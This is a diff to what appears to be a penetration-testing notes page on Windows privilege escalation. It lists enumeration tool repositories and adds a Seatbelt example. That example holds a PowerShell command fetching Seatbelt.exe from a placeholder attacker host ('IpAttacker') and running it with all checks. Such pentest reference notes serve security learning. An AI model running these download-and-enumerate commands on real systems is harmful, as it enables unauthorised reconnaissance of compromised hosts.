@@ -119,9 +119,14 @@ URLs:
 - https://github.com/Marshall-Hallenbeck/compiled_binaries
 - https://github.com/411Hall/JAWS
 
-Seatbelt usage:
+##### Example: Seatbelt
+
+Compiled version: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
+
+Usage:
 ```
-seatbelt.exe -group=all
+PS> iwr http://IpAttacker/Seatbelt.exe -OutFile Seatbelt.exe
+PS> .\Seatbelt.exe -group=all
 ```
 
 ## Services
